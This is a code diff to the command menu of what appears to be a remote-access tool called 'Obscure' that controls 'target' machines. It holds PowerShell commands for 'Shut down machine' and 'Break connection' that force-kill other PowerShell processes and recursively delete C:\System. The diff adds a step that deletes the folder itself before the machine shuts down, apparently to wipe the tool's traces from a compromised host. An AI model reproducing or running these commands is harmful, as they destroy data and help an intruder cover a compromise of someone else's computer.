@@ -51,7 +51,7 @@ GLOBAL_OPTIONS = { # Create the structure for all user options and commands
 
     "Shut down machine": {
         "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
-            "Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Get-ChildItem -Path C:\\System\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Stop-Computer -Force",
+            "Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Get-ChildItem -Path C:\\System\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; cd C:\\; Remove-Item C:\\System -Force; Stop-Computer -Force",
             "",
             "<ENDOF_CONNECTION>"
         )
@@ -67,7 +67,7 @@ GLOBAL_OPTIONS = { # Create the structure for all user options and commands
 
     "Break connection": {
         "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
-            "Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Get-ChildItem -Path C:\\System\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Get-Process powershell | Stop-Process -Force",
+            "Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Get-ChildItem -Path C:\\System\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; cd C:\\; Remove-Item C:\\System -Force; Get-Process powershell | Stop-Process -Force",
             "",
             "<ENDOF_CONNECTION>"
         )
